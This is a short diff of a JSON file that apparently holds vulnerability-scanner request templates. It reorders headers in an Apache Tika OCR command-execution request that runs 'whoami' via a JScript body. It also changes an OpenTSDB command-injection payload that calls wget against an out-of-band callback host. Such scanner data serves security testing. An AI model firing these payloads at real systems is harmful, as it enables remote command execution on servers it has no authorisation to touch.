@@ -6816,11 +6816,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
-            "X-Tika-OCRTesseractPath": "cscript",
-            "X-Tika-OCRLanguage": "//E:Jscript",
             "Expect": "100-continue",
             "Content-type": "image/jp2",
-            "Connection": "close"
+            "Connection": "close",
+            "X-Tika-OCRTesseractPath": "cscript",
+            "X-Tika-OCRLanguage": "//E:Jscript"
           },
           "method": "PUT",
           "path": [
@@ -12935,7 +12935,7 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/q?start=2000/10/21-00:00:00&end=2020/10/25-15:56:44&m=sum:sys.cpu.nice&o=&ylabel=&xrange=10:10&yrange=[33:system(%27wget%20http://interact.sh%27)]&wxh=1516x644&style=linespoint&baba=lala&grid=t&json"
+            "{{BaseURL}}/q?start=2000/10/21-00:00:00&end=2020/10/25-15:56:44&m=sum:sys.cpu.nice&o=&ylabel=&xrange=10:10&yrange=[33:system(%27wget%20http://{{interactsh-url}}%27)]&wxh=1516x644&style=linespoint&baba=lala&grid=t&json"
           ]
         }
       ]
